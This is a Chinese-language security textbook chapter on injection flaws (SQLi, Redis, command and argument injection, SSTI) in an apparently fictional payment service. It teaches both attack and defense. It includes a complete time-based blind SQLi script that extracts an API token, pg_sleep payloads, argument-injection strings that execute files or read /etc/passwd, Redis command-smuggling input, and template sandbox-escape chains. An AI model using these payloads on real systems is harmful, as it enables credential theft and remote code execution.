# 第 8 章：注入家族的本質：資料與控制平面的混同

我們每天都在後端寫各種查詢與呼叫外部工具的邏輯：用 Prisma 或 TypeORM 組裝分頁報表、把請求參數塞進 Redis 鍵名做快取、用 `child_process` 呼叫 `wkhtmltopdf` 或 `git` 處理檔案，或是用 Handlebars 渲染商戶通知信。自從現代框架普及了 SQL 參數化查詢（Parameterized Query），許多團隊就以為注入漏洞已經走入歷史。

但在真實的生產環境裡，這類破口只是換了一張臉繼續出現。只要業務邏輯遇到無法綁定佔位符的地方，或者資料跨出 SQL 進入 Redis RESP 協定、作業系統命令列與伺服器端模板引擎，同樣的結構性漏洞就會當場引爆。本章會把 SQLi、NoSQL/Redis 注入、Command Injection、Argument Injection 與 SSTI 放在同一個鏡子底下，拆解它們共通的底層機制。

---

## 從你已知的出發

為什麼系統全面改用了 Prisma 或 TypeORM，也把 `child_process.exec` 換成了不經過 Shell 的 `execFile`，卻還是會被打出 SQL 盲注與遠端指令執行？

原因在於**參數綁定與無 Shell 執行只保護了第一道邊界，卻擋不住語法結構本身的動態拼接與下游的二次解析**。在編譯器與直譯器裡，程式碼都得先經詞法分析（Lexing）切出 Token、再經語法分析（Parsing）建出抽象語法樹（AST）：只要在 Parser 介入前用字串拼接塞入外部輸入，特殊字元就能偽造語法界線並改寫 AST；就算用 `execFile` 繞開了 Shell Parser，目標執行檔內部的 `getopt` 還是會在單一字串裡把 `--upload-pack=...` 拆成控制旗標。守住所有注入漏洞的唯一鐵律，就是**讓外部輸入永遠停留在純資料平面，絕不讓它在任何一層解析器裡跨進控制平面**（至於原型鏈污染與 LLM 提示詞注入，則分別留在第 13 章與第 16 章拆解）。

---

## 機制與推導

### 攻擊者目標與實質影響

攻擊者挖掘注入類漏洞，目的不是為了讓後端噴出語法錯誤，而是為了強迫直譯器或執行環境把外部傳入的純資料當成控制指令來跑：

在資料庫層面，最直接的收益就是全庫脫褲與越權竄改。攻擊者利用報表動態排序等 ORM 殘留破口發動盲注（Blind SQLi），就能一步步抽乾 NexusPay 的全域交易帳本、商戶個資與 API 金鑰。

在伺服器層面，終極目標則是遠端程式碼執行（RCE）。無論是透過伺服器端模板注入（SSTI）逃逸沙箱，還是利用命令與參數注入喚起外部執行檔，最終都是為了直接拿到作業系統 Shell，徹底接管該台後端節點。

拿到資料庫最高權限或容器 Shell 之後，這塊破口就會成為跨層攻擊鏈的跳板。攻擊者可以順手抹除稽核日誌、讀取記憶體與環境變數裡的內部連線憑證，接著往叢集內網發動橫向移動。

### 1. 現代 ORM 的 SQLi 殘留面與 Blind SQLi 推導

為什麼參數化查詢能擋住 SQL 注入？因為資料庫驅動程式走了底層的分離協定。以 PostgreSQL 的 Extended Query Protocol 為例，它分成了 `Parse`、`Bind`、`Execute` 三個階段：後端先把帶有 `$1` 佔位符的 SQL 骨架送進伺服器，在 `Parse` 階段剖析成固定的語法樹（AST）；等到 `Bind` 階段時，才把使用者輸入當作純資料綁到佔位符上。因為參數值從頭到尾都不會經過 SQL Lexer，自然不可能改變語法結構。

但 SQL 語法本身有一條死規矩：佔位符（`$1` 或 `?`）只能代表**資料值**（Data Value，例如純量字串、數字或陣列）。它**絕對不能用來代替資料表名稱、欄位名稱、排序方向關鍵字（`ASC` / `DESC`）或是 SQL 運算子**。

問題就出在這裡。當 NexusPay 的商戶報表 API 需要支援「讓前端指定任意欄位排序」時，開發者發現 `$1` 塞不進 `ORDER BY`，往往就會寫出下面這兩種危險程式碼：

```typescript
// 破口示範：TypeORM / Prisma 動態排序與 Raw SQL 拼接
// 1. Prisma 誤用 $queryRawUnsafe 直接拼入排序欄位
const sortCol = req.query.sort ?? 'created_at'; // 攻擊者可控
const rows = await prisma.$queryRawUnsafe(
  `SELECT id, amount_cents, status FROM ledger_entries
   WHERE tenant_id = $1 ORDER BY ${sortCol} DESC LIMIT 50`,
  tenantId
);

// 2. TypeORM QueryBuilder 的 orderBy 第一個參數未經驗證
// TypeORM 底層會把 orderBy 的欄位名稱直接字串拼進 SQL，不走參數綁定！
await dataSource
  .getRepository(LedgerEntry)
  .createQueryBuilder('entry')
  .where('entry.tenant_id = :tid', { tid: tenantId })
  .orderBy(String(req.query.sort), 'DESC')
  .getMany();
```

在 `ORDER BY` 後面，雖然多數資料庫驅動禁止用分號 `; DROP TABLE` 堆疊多條語句，但 PostgreSQL 完全允許在 `ORDER BY` 後面放任意的純量運算式（Expression）。這代表攻擊者可以塞入 `CASE WHEN (...) THEN ... ELSE ... END` 條件分支，並在裡面呼叫系統睡眠函式 `pg_sleep()`。

當這支 API 只回傳排序後的帳務列表、甚至只回傳 HTTP 狀態碼而不會把資料庫錯誤訊息印在畫面上時，攻擊者就進入了**盲注**（Blind SQLi）模式。假設 NexusPay 的 `api_tokens` 資料表裡躺著一組 32 字元的十六進位（Hex：`0-9a-f`）管理員 Token，攻擊者雖然看不到查詢結果，卻能靠著回應內容的順序變化（Boolean-Based）或回應延遲（Time-Based），每次向資料庫問一個「是非題」。

如果傻傻地從 `0` 到 `f`（共 16 種等可能字元）逐一線性猜測，效率會非常低。按「逐項比對確認（測試 1 到 16 次）」來算，猜中一個字元平均要發 $(1+16)/2 = 8.5$ 次請求，32 個字元平均得發 `32 × 8.5 = 272` 次請求（最壞情況 `32 × 16 = 512` 次；就算前 15 項都錯就直接推知是第 16 項，每字元平均也要 $135/16 = 8.4375$ 次，32 字元平均 `270` 次、最壞 `32 × 15 = 480` 次）。在尖峰流量達 `2,000 req/s` 的 NexusPay 線上環境裡，連續發幾百次帶有睡眠延遲的請求，很容易觸發監控告警或塞爆資料庫連線池。

這時只要改用**二分搜尋**（Binary Search）或逐位元拆解，就能把每個字元的猜測次數死死壓在 $\log_2(16) = 4$ 次：

```text
=== Worked Example：PostgreSQL Time-Based Blind SQLi 二分搜尋萃取推導 ===

目標：從 NexusPay 報表排序參數 ORDER BY <expr> 偷出 32 字元 Hex Token (字元集 0-9a-f)
字元空間：16 種可能（ASCII '0'-'9' = 48-57, 'a'-'f' = 97-102；或直接轉成 4-bit 數值 0..15）

[1] 查詢次數比較
- 線性掃描（Linear Search）：
  * 逐項確認模型（1..16）：每字元平均 8.5 次 → 32 字元平均 32 × 8.5 = 272 次（最壞 32 × 16 = 512 次）。
  * 末項排除模型（1..15）：每字元平均 8.4375 次 → 32 字元平均 32 × 8.4375 = 270 次（最壞 32 × 15 = 480 次）。
- 二分搜尋（Binary Search，把 16 個候選字元對應到整數索引 0..15 每次折半）：
  每字元固定只需 log2(16) = 4 次比較。
  總請求數 = 32 × 4 = 128 次（比逐項確認平均 272 次省下 52.9%，比末項排除平均 270 次省下 52.6%）。

[2] 單一字元的 4 步二分搜尋軌跡（假設第 1 個字元真實值是 'b'，對應十六進位索引 idx = 11）
  先把 16 個候選字元對應成排序索引 idx ∈ [0, 15]（'0'..'9' → 0..9, 'a'..'f' → 10..15）：
  SQL 轉 4-bit 索引運算式：
  idx = POSITION(SUBSTRING((SELECT token FROM api_tokens LIMIT 1), 1, 1) IN '0123456789abcdef') - 1
  注入 Payload 模板：
  (CASE WHEN (POSITION(SUBSTRING((SELECT token FROM api_tokens LIMIT 1), 1, 1) IN '0123456789abcdef') - 1 > <mid>)
        THEN (SELECT 1 FROM pg_sleep(0.5)) ELSE 1 END)

  Step 1: 範圍 [0, 15], mid = 7  → 問 idx > 7  (11 > 7  為 True ) → 回應約 545 ms → 範圍縮為 [8, 15]
  Step 2: 範圍 [8, 15], mid = 11 → 問 idx > 11 (11 > 11 為 False) → 回應約 45 ms  → 範圍縮為 [8, 11]
  Step 3: 範圍 [8, 11], mid = 9  → 問 idx > 9  (11 > 9  為 True ) → 回應約 545 ms → 範圍縮為 [10, 11]
  Step 4: 範圍 [10, 11], mid = 10 → 問 idx > 10 (11 > 10 為 True ) → 回應約 545 ms → 鎖定 idx = 11 ('b')

[3] 網路抖動門檻與總耗時實算
- 實測正常請求 RTT：P50 = 32 ms, P99 = 45 ms, 標準差 σ = 8 ms
- 設定單次睡眠時間 S = 500 ms (0.5 s)：
  False 分支（不睡）的 P99 延遲 = 45 ms
  True  分支（睡 0.5 s）的 P99 延遲 = 500 + 45 = 545 ms
  將判定門檻設在 T = 300 ms：距離 False P99 (45 ms) 足足有 (300 - 45) / 8 = 31.875σ 的安全邊距，
  幾乎不會因為網路抖動誤判，而且遠低於 NexusPay Nginx 閘道的 30 s 請求逾時上限。
- 總耗時估算（假設 128 次請求裡 True 與 False 各佔 64 次，並以 P99 延遲 545 ms / 45 ms 估算）：
  總循序耗時 = 64 × 0.545 s + 64 × 0.045 s = 34.88 s + 2.88 s = 37.76 s
  （若該端點能看出排序順序差異而改用無睡眠的 Boolean-Based 盲注，以單次 45 ms 算只需 128 × 0.045 s = 5.76 s）
```

實戰寫 Time-Based 盲注腳本時，還有一個新手常踩的雷：千萬要看清楚 `pg_sleep()` 被放在哪裡求值。如果某條查詢會掃描 1,000 筆帳務資料列，而你的 `pg_sleep(0.5)` 剛好在每一列都會被執行一次，資料庫就會老老實實連睡 `1,000 × 0.5 s = 500 s`。在 NexusPay 架構裡，只要後端超過 `30 s` 沒吐出半個 byte，最外層 Nginx 的 `proxy_read_timeout = 30 s` 就會直接掐斷連線回傳 `504 Gateway Timeout`，同時還把資料庫的工作執行緒卡死將近十分鐘。所以實戰中一定會把 `pg_sleep()` 包在只求值一次的純量子查詢或 `LIMIT 1` 裡面，確保每次請求最多只睡一次。

---

### 2. NoSQL 與 Redis RESP 協定注入

很多人以為 Redis 或 MongoDB 沒有 SQL 語法解析器，就不會有注入問題。其實只要底層通訊協定靠**定界符**（Delimiter）或腳本直譯器來區分指令跟資料，混同的風險就一分也沒少。

先看 Redis 底層的 **RESP**（Redis Serialization Protocol）通訊協定。它同時支援兩種报文格式：

第一種是正規客戶端套件（如 `ioredis`、`node-redis`）預設使用的 **Multibulk 格式**。它會在每一段資料前面明確標註參數個數與位元組長度，例如 `*3\r\n$3\r\nSET\r\n$3\r\nkey\r\n$3\r\nval\r\n`。因為長度早就鎖死了，你在參數裡面塞再多 `\r\n` 換行字元，Redis 也只會把它當成字串內容的一部分，切不出新指令。

第二種則是為了方便人類用 `nc` 或 `redis-cli` 除錯而保留的 **Inline Command 格式**，直接用空白切參數、用 `\r\n` 切指令。如果後端在自幹連線池、除錯介面或拼裝原始管線時，把使用者輸入直接用字串拼進 raw 指令送給 Redis，一個 `\r\n` 就能當場切斷原本的指令，在下一行偷渡任意的 Redis 命令：

```text
正常傳輸（原本只想查 1 個 Session）：
GET session:user_1042\r\n

攻擊者傳入 user_id = "1042\r\nSET role:1042 admin\r\nGET x"：
GET session:user_1042\r\n
SET role:1042 admin\r\n
GET x\r\n
```

就算團隊乖乖用了走 Multibulk 格式的現代 Redis 客戶端，擋掉了 `\r\n` 換行注入，後端還是常在另外兩個地方翻車：

第一個常見破口是**鍵名空間碰撞與萬用字元探測**（Key Namespace / Glob Injection）。我們寫 Redis 時很習慣用冒號 `:` 來切分資料階層，比如 `acct:${userId}` 跟 `acct:42:role`。如果程式沒有先檢查 `userId` 的格式就直接字串拼接，攻擊者只要傳入 `userId = "42:role"`，就能直接跨界讀寫相鄰的權限鍵值；要是後端還把未過濾的輸入塞進 `KEYS` 或 `SCAN ... MATCH` 這類支援 Glob 模式比對的指令，攻擊者傳個 `*` 或 `?` 就能把同一個 Redis 實例裡的其他商戶鍵名摸得一清二楚。

第二個更致命的破口是 **Lua 腳本與 `EVAL` 字串拼接**。為了做分散式鎖或原子扣款，後端很常呼叫 `redis.eval()`。如果開發者圖方便，把外部變數直接用樣板字串拼進 Lua 原始碼裡，而不是透過正規的 `KEYS[]` 與 `ARGV[]` 陣列傳進去，那就等於在 Redis 內部的 Lua 直譯器裡重新打開了注入大門。雖然 Redis 的 Lua 沙箱拔掉了 `os`、`io` 等系統模組，但攻擊者只要能逃出 Lua 字串引號，就能隨意呼叫 `redis.call()` 竄改整個快取實例裡的資料——例如把 NexusPay 某個測試帳戶的快取餘額從 `10,000` 分直接改成任意數字，徹底破壞多租戶隔離。

---

### 3. Command Injection：`exec` vs `execFile` 與 Argument Injection

當後端需要呼叫外部命令列工具（像是壓縮報表、轉檔、操作 Git 或呼叫圖片處理器）時，Node.js 的 `child_process` 提供了兩組長得很像、底層行為卻天差地遠的 API：`exec()` 與 `execFile()`（在 Python 裡則對應 `subprocess.run` 的 `shell=True` 與 `shell=False`）。

```text
+-------------------------------------------------------------------+
|  exec("convert " + userFile + " out.png")                         |
|  → /bin/sh -c "convert foo.jpg; id out.png"                       |
|  → Shell Parser 看到 ; | && || $() ` ` 就切出多條指令 AST 執行    |
+-------------------------------------------------------------------+
                                 vs
+-------------------------------------------------------------------+
|  execFile("convert", [userFile, "out.png"])                       |
|  → execve("/usr/bin/convert", ["convert", userFile, "out.png"])   |
|  → 不開 Shell，OS 直接傳遞 argv[] 陣列；裡面的 ; | $() 全是純文字 |
+-------------------------------------------------------------------+
```

只要沒把選項設成 `shell: true`，而且執行的是普通的非 Shell 執行檔，改用 `execFile` 確實能徹底消滅 **Shell Command Injection**。因為作業系統的 `execve()` 系統呼叫會把陣列裡的每一個字串，原封不動地當成獨立的 `argv[i]` 傳給目標程式，中間根本沒有 `/bin/sh` 出來解析分號或反引號。

但為什麼很多換了 `execFile` 的系統還是被打穿了？這就是前面提過的 **Argument Injection**（參數注入）。

雖然沒有了 Shell Parser，但目標執行檔一啟動，它自己肚子裡的 `getopt` 或命令列解析器就會開始掃描 `argv[]`。只要攻擊者能控制某個參數的開頭是 `-` 或 `--`，目標程式就會把原本應該是「檔名或網址」的純資料，當成控制程式行為的**命令列旗標**（Flag）：

先看 `git clone <user_url> <dir>`。如果攻擊者傳入的網址字串是 `--upload-pack=/tmp/evil.sh`（或短選項 `-u/tmp/evil.sh`），支援該旗標的 `git` 版本看到 `--upload-pack` 就會以為你要指定遠端通訊輔助程式，直接把 `/tmp/evil.sh` 執行起來，過程完全不需要經過 Shell。

再看 `curl <user_url>`。就算只有一個可控的 `argv` 元素，攻擊者只要傳入 `--config=/etc/passwd` 或 `-o/app/config.json`（短選項緊貼著路徑、或長選項用 `=` 連接，連空白字元都不需要），就能逼 `curl` 讀取敏感檔案或把回應覆寫到系統設定檔上。

最經典的還有 `tar -cf out.tar <user_files>`。GNU `tar` 內建了 `--checkpoint=1` 與 `--checkpoint-action=exec=...` 這組進階旗標；只要攻擊者能把待打包的檔名設成這兩個字串，`tar` 打包到一半就會自己幫你執行指定的外部命令。

要堵死 Argument Injection，只過濾 `;` 跟 `|` 一點用都沒有。正確的做法是在確認目標工具支援 POSIX 標準的**選項終止符 `--`**（End-of-Options Marker）之後，在所有動態位置參數（Positional Arguments）前面明確塞一個 `'--'` 元素。這等於跟目標程式的 `getopt` 下達死命令：「`--` 後面出現的任何字串，就算用 `-` 開頭也一律當成普通檔名，不准再當成旗標解析！」當然，針對業務預期的檔名或網址格式（如只准 `https://` 開頭）做白名單檢查，也依然不能少。

---

### 4. SSTI（伺服器端模板注入）與沙箱逃逸

最後來看 **SSTI**（Server-Side Template Injection）。這類漏洞幾乎都源自同一個失誤：後端為了做出「動態客製化通知信」或「自訂發票版型」，把使用者輸入的字串**直接拼進了模板原始碼**（Template Source）裡面才拿去編譯，而不是把它當成**上下文資料變數**（Context Data）傳給早就編譯好的固定模板：

```javascript
// 致命寫法：使用者輸入在 compile() 之前就混進了模板原始碼
const tpl = `<h1>商戶通知：${req.body.merchantName}</h1><p>餘額：{{balance}}</p>`;
const html = handlebars.compile(tpl)({ balance: 10000 });

// 安全寫法：模板語法結構固定，使用者輸入只在資料平面傳遞
const safeTpl = handlebars.compile(`<h1>商戶通知：{{merchantName}}</h1><p>餘額：{{balance}}</p>`);
const safeHtml = safeTpl({ merchantName: req.body.merchantName, balance: 10000 });
```

一旦使用者輸入混進了 `compile()`，攻擊者就能寫入 `{{...}}` 或 `<%= ... %>` 模板指令。SSTI 之所以一打穿就是高危 RCE，是因為絕大多數現代模板引擎（像 Python 的 Jinja2，或是 Node.js 的 EJS、Pug、Handlebars）為了效能，底層都會把模板編譯成宿主語言的原生函式（Python Bytecode 或 JavaScript 的 `new Function(...)`）。

很多框架宣稱自己的模板有「沙箱保護」，不准在模板裡直接寫 `import os` 或 `require('child_process')`。但在動態語言強大的**物件反射**（Reflection）與**原型鏈**面前，語言層級的沙箱往往跟紙糊的一樣脆弱（實際能否逃逸取決於引擎版本與屬性攔截組態）：

在 Python 的 Jinja2 環境裡，如果沙箱沒有嚴格擋下雙底線屬性存取，攻擊者根本不需要 `import`。只要在模板裡寫一個最普通的空字串 `""`，它本身就是一個合法的 Python `str` 物件；順著 `"".__class__.__mro__[1].__subclasses__()` 往上爬到頂層的 `object` 基底類別，再把當前直譯器載入過的所有子類別全部列出來，就能從裡面挑出帶有 `__init__.__globals__` 的內建類別，一路摸進 `__builtins__` 呼叫系統指令。

在 Node.js 的模板引擎（例如早期未封死原型屬性存取的 Handlebars 版本，或是直接求值 JS 表達式的引擎）裡，套路也一模一樣。只要能從任意變數順著 `.constructor.constructor` 摸到 JavaScript 的 `Function` 建構子，就能呼叫 `Function("return process")()` 拿到全域的 `process` 物件，進而載入底層模組執行任意程式碼。

---

## 故障模式與防禦

看懂前面四種注入家族的底層機制後，我們回頭檢查後端程式碼，就會發現工程師最容易在以下四個地方踩進「以為修好了、其實一戳就破」的陷阱。

### 故障模式 1：以為用了 ORM 就天下無敵，卻在動態排序破功

很多團隊規定全面使用 Prisma、TypeORM 或 Knex，就以為系統已經跟 SQLi 絕緣了。結果一碰到後台報表需要動態排序、動態挑選欄位或全文檢索時，隨手就把前端傳來的 `req.query.sort` 塞進 `ORDER BY` 或 `$queryRawUnsafe`。因為資料庫的參數佔位符根本不收欄位名，這個角落就成了整套系統最肥美的盲注破口。

對付這類無法參數化的動態識別字（資料表名、欄位名、排序方向），唯一安全的做法就是**靜態白名單查表**（Static Allowlist Map）。永遠不要把使用者傳來的字串直接放進 SQL 裡，而是拿它當 Key 去查一張寫死在程式碼裡的常數對照表：

```typescript
const SORT_COLUMN_MAP: Record<string, string> = {
  createdAt: 'created_at',
  amount: 'amount_cents',
  status: 'status',
};
const SORT_DIR_MAP: Record<string, 'ASC' | 'DESC'> = {
  asc: 'ASC',
  desc: 'DESC',
};

const rawSort = String(req.query.sort ?? '');
const rawDir = String(req.query.dir ?? '');

// 關鍵：用 Object.hasOwn 檢查自有屬性，防止攻擊者傳入 "toString" 或 "constructor" 命中原型鏈！
const safeCol = Object.hasOwn(SORT_COLUMN_MAP, rawSort)
  ? SORT_COLUMN_MAP[rawSort]
  : 'created_at';
const safeDir = Object.hasOwn(SORT_DIR_MAP, rawDir)
  ? SORT_DIR_MAP[rawDir]
  : 'DESC';
```

這樣不管外面傳什麼妖魔鬼怪進來，最後拼進 SQL 的 `safeCol` 與 `safeDir` 都 100% 是你自己寫死的常數字串，連半個外部字元都混不進去。

### 故障模式 2：在進 Sink 前用正規表達式「洗掉壞字元」

當掃描器報出 Command Injection 或 SQLi 時，最常見的急救章修法就是寫一條正規表達式，把 `;`、`|`、`'`、`--` 或 `pg_sleep` 替換成空字串。

這種黑名單過濾（Sanitization）在實戰中幾乎必敗。攻擊者只要換個編碼（雙重 URL 編碼、Unicode 正規化）、在 Shell 裡用 `${IFS}` 或 Tab 代替空白字元，或者在 PostgreSQL 裡改用美元符號引號 `$$...$$` 代替單引號 `'`，黑名單當場就形同虛設。

正統的防禦思維，是**放棄清洗混在一起的字串，直接從架構上把資料跟指令隔開**：
- **SQL 查詢**：全面走參數化查詢（Extended Query Protocol），動態欄位一律走前面的靜態常數查表。
- **外部程式呼叫**：如果有原生函式庫可以用（例如用 Node.js 的 `sharp` 套件處理圖片，取代呼叫外部的 ImageMagick `convert` 執行檔），就直接拔掉子行程呼叫；非得呼叫 CLI 工具不可時，一律用 `execFile` 或 `spawn(..., { shell: false })`，並在位置參數前加上 `'--'` 終止旗標解析。
- **模板渲染**：模板原始碼必須是靜態常數並預先編譯，使用者輸入只能放進 Context Object 變數裡傳入。

### 故障模式 3：把未驗證的參數直接拼進 Redis 鍵名與 Lua 腳本

後端在寫快取時，很常把未經驗證的 `tenantId` 或 `userId` 直接用樣板字串拼成 `acct:${tenantId}:${userId}`，或是把動態參數直接嵌進 `EVAL` 的 Lua 腳本字串裡。

要鎖緊 Redis 邊界，除了確保客戶端走正規的 Multibulk 協定之外，所有拼進鍵名的動態 ID 都必須先過嚴格的字元集白名單（例如強制檢查是否為合法 UUIDv4，或限制為 `^[a-zA-Z0-9_-]{1,64}$`），把冒號 `:`、萬用字元 `*` / `?` 以及換行 `\r` / `\n` 全部擋在門外。至於呼叫 `EVAL` 執行 Lua 腳本時，腳本本體必須是固定不變的常數字串，所有動態鍵名跟數值一律透過 `KEYS[]` 與 `ARGV[]` 陣列傳入，並在腳本開頭先核對租戶權限。

### 故障模式 4：相信語言層級的模板沙箱能擋住自訂模板

當產品經理要求「讓商戶自己寫通知信或對帳單模板」時，很多工程師會直接開放 Handlebars、Jinja2 或 EJS 給使用者填寫，並以為只要打開引擎的 `sandbox: true` 或擋掉 `__proto__` 字串就能高枕無憂。

從前面的反射逃逸推導就知道，讓不受信任的使用者字串走進具備完整程式表達能力的模板編譯器，風險高得嚇人。如果業務真的需要讓用戶自訂版型，首選是採用**完全沒有運算與屬性反射能力**（Logic-less）的純文字替換方案，或是把原型鏈查找徹底鎖死的極簡引擎。

要是業務非得支援複雜條件與迴圈不可，那就絕對不能在主服務的 Node.js / Python 行程裡跑，必須把模板編譯與渲染丟進**作業系統級的隔離沙箱**（例如沒有網路權限、沒有掛載任何內部金鑰環境變數、且受 seccomp 嚴格限制的獨立容器或 microVM）裡執行。

---

## 動手做

- **難度**：進階
- **預估時間**：60 分鐘

在這個實驗裡，我們要在本地 NexusPay 靶機（Node.js 22 + PostgreSQL 16，跑在 `http://127.0.0.1:3000`）上實測報表服務的動態排序端點 `GET /v1/reports/ledger?sort=...`。這支端點內部正是用了未設防的 `ORDER BY ${sort} DESC`。請你先站在攻擊者角度寫一支二分搜尋盲注腳本，在精確 **128 次請求**內偷出 `api_tokens` 表裡的 32 字元 Hex Token；接著再切換回防禦者角度把它徹底修補好。

### 步驟 1：手動探測延遲訊號與撰寫二分搜尋腳本

啟動本地 NexusPay 容器環境後，先用 `curl` 測測看正常排序與注入 `pg_sleep(0.5)` 的回應時間差，確認延遲訊號乾不乾淨：
- 正常請求：`GET /v1/reports/ledger?sort=created_at`
- 延遲探針：`GET /v1/reports/ledger?sort=(SELECT+1+FROM+pg_sleep(0.5))`（注意這裡用純量子查詢包住 `pg_sleep`，確保不管表裡有幾筆帳務都只會睡一次）。

確認延遲大約落在 `0.5 s` 後，請撰寫一支 Python 腳本 `blind_sqli_bsearch.py`：
1. 針對 Token 的第 `pos = 1..32` 個字元，利用 PostgreSQL 的 `POSITION(SUBSTRING((SELECT token FROM api_tokens LIMIT 1), {pos}, 1) IN '0123456789abcdef') - 1` 運算式，把字元轉成 `0..15` 的整數索引。
2. 對每個位置以 `low = 0, high = 15` 跑 4 步二分搜尋，把延遲判定門檻設在 `THRESHOLD = 0.30` 秒（介於正常 P99 `45 ms` 與睡眠後 `545 ms` 正中間）。
3. 印出最終偷到的 32 字元 Token、總請求次數與總耗時，驗證請求次數是否剛好等於 `128` 次。

### 步驟 2：重構為靜態白名單並驗證防線

打開 NexusPay 報表服務的 `src/reports/ledger.service.ts`，把原本直接拼接字串的 `$queryRawUnsafe` 換成前面「故障模式 1」介紹的 `SORT_COLUMN_MAP` 靜態白名單查表（搭配 `Object.hasOwn` 檢查），遇到不在白名單裡的 `sort` 參數就直接回傳 `400 Bad Request`。重啟服務後再跑一次你的攻擊腳本，確認第一發請求就被擋在資料庫門外。

### 外部靶場對照檢查點（PortSwigger Web Security Academy）

本地實驗跑通後，推薦到 **PortSwigger Web Security Academy** 挑下面三個主題的 Practitioner / Expert 關卡練手，測試看看能不能把同一套 AST 混同思維搬到黑箱環境（以下只給破關思維提示，不給現成答案）：

1. **SQL injection**（檢查點：*Blind SQL injection with time delays and information retrieval*）：打黑箱盲注時，第一步永遠是先摸清楚對方的資料庫方言（PostgreSQL、Oracle 還是 MySQL），因為各家的字串擷取跟條件睡眠語法長得不一樣；一旦確認能穩定控制睡眠秒數，不管注入點藏在 URL 還是 Cookie 裡，直接把你剛寫好的二分搜尋腳本改個 SQL 模板套上去就能秒解。
2. **Server-side template injection**（檢查點：*Server-side template injection in an unknown language with a documented exploit*）：遇到不知道底層是哪套模板引擎的黑箱時，先丟幾組探針（像 `${7*7}`、`{{7*7}}`、`{{7*'7'}}`）看它是原樣吐回來、算成 `49` 還是變成 `'7777777'`。認出引擎跟宿主語言（Python 還是 Node.js / Java）後，再順著該語言的物件反射鏈往上爬。
3. **OS command injection**（檢查點：*Blind OS command injection with output redirection* 與 *out-of-band data exfiltration*）：當你注入的系統指令完全不會把輸出印在網頁上時，先用 `sleep 5` 或 `ping -c 5 127.0.0.1` 確認指令真的有跑起來；接著看是要把輸出導向（`>`）到網站的靜態圖片目錄底下再去下載，還是利用 `curl` / `nslookup` 把結果夾在 DNS 或 HTTP 請求裡外帶出來。

---

### 參考解答

下面是 `blind_sqli_bsearch.py` 的完整實作與修補驗證重點：

```python
import time
import requests

TARGET = "http://127.0.0.1:3000/v1/reports/ledger"
HEX_CHARS = "0123456789abcdef"
SLEEP_SEC = 0.5
THRESHOLD = 0.30  # 切在正常 P99 (45 ms) 與睡眠後 (545 ms) 之間

def is_greater(pos: int, mid: int) -> bool:
    expr = (
        f"(CASE WHEN (POSITION(SUBSTRING((SELECT token FROM api_tokens LIMIT 1), {pos}, 1) "
        f"IN '{HEX_CHARS}') - 1 > {mid}) "
        f"THEN (SELECT 1 FROM pg_sleep({SLEEP_SEC})) ELSE 1 END)"
    )
    t0 = time.monotonic()
    r = requests.get(TARGET, params={"sort": expr}, timeout=5)
    elapsed = time.monotonic() - t0
    if r.status_code != 200:
        raise RuntimeError(f"Rejected or error (HTTP {r.status_code}) at pos={pos}, mid={mid}")
    return elapsed >= THRESHOLD

def extract_token(length: int = 32) -> tuple[str, int]:
    result = []
    req_count = 0
    for pos in range(1, length + 1):
        low, high = 0, 15
        while low < high:
            mid = (low + high) // 2
            req_count += 1
            if is_greater(pos, mid):
                low = mid + 1
            else:
                high = mid
        result.append(HEX_CHARS[low])
    return "".join(result), req_count

if __name__ == "__main__":
    t_start = time.monotonic()
    token, count = extract_token(32)
    print(f"Extracted token: {token} | Requests: {count} | Time: {time.monotonic() - t_start:.2f}s")
```

#### 實測結果與修補驗證

對著還沒修補的靶機執行 `python3 blind_sqli_bsearch.py`，終端機會穩定印出 `Requests: 128`，並在約 `37.8 秒` 左右（視 True/False 分支分布與本機容器延遲而定）完整拼出 32 字元的管理員 Token。

接著在 `src/reports/ledger.service.ts` 裡拔掉 `$queryRawUnsafe`，改成用 `Object.hasOwn(SORT_COLUMN_MAP, sortParam)` 檢查白名單，只要不合法就立刻回傳 `400 Bad Request`。重啟服務再跑一次腳本，第 1 發請求就會因為收到 `HTTP 400` 當場拋出 `RuntimeError` 停下來；去翻 PostgreSQL 的查詢日誌，也會看到那串惡意的 `CASE WHEN ... pg_sleep` 根本連資料庫的邊都沒摸到。

---

## 自我檢核

- **難度**：入門
- **預估時間**：20 分鐘

先別往回翻正文，試著用這章學到的「解析器邊界」與「二次解析」觀念，回答下面 4 個問題：

1. **為什麼 `ORDER BY` 不能直接綁參數**：很多新手在修動態排序的 SQLi 時，會試著寫出 `SELECT * FROM invoices WHERE tenant_id = $1 ORDER BY $2 DESC`，結果發現選出來的資料根本沒有照指定的欄位排序。請從資料庫協定剖析語法樹（AST）的階段，解釋為什麼 `$2` 沒辦法當成欄位名稱來用？
2. **換了 `execFile` 還是中招**：某個開源備份系統為了把商戶資料同步到遠端主機，把原本危險的 `exec` 改寫成 `execFile('rsync', ['-a', userSourcePath, '/var/backups/sync/'])`（其中 `userSourcePath` 是使用者傳入的字串）。為什麼就算完全不經過 Shell，攻擊者還是能靠著傳入特定的 `userSourcePath` 字串在伺服器上執行任意程式？要怎麼加一個標準符號並搭配檢查來堵死它？
3. **Redis 兩層解析器的盲點**：既然現代 Node.js 的 `ioredis` 客戶端預設走 Multibulk 協定（每個參數都帶有明確的 `$長度` 前綴），能確保我們傳進去的字串絕對不會在 Redis 通訊協定層被 `\r\n` 切成多條指令，為什麼把未過濾的 `req.body.note` 直接用字串拼進 `redis.eval(\`return redis.call('SET', KEYS[1], '${req.body.note}')\`, 1, key)` 裡面，還是會爆出嚴重注入？
4. **盲注請求次數實算**：假設你在做紅隊演練時，遇到一個只能靠 Time-Based Blind SQLi 每次問一個是非題的端點，而這次的目標是偷出一段 **20 字元的 Base64URL Token**（每個字元有 64 種可能）。如果改用二分搜尋法，在網路穩定、每次請求都能提供一次可靠比較的理想情況下，精確需要發送幾次請求才能把這 20 個字元全部摸出來？

---

### 參考解答

1. **為什麼 `ORDER BY` 不能直接綁參數**：
   - 在 PostgreSQL 的 Extended Query Protocol 裡，`Parse` 階段就會先把 SQL 字串剖析成固定不變的抽象語法樹（AST），這時哪個節點是資料表、哪個節點是欄位識別字、哪裡是參數佔位符都已經釘死了；後面的 `Bind` 階段只負責把純資料值（Data Value）塞進佔位符節點裡。
   - 如果你寫成 `ORDER BY $2` 並綁定字串 `'amount_cents'`，資料庫看到的不是「照 `amount_cents` 這個欄位排序」，而是「幫每一列都算一個固定常數值 `'amount_cents'`，然後照這個常數排序」——因為每一列算出來的值都一模一樣，當然排不出任何順序。動態欄位名與排序方向必須在應用程式端用靜態白名單字典（搭配 `Object.hasOwn`）轉成寫死的常數字串。
2. **換了 `execFile` 還是中招（Argument Injection）**：
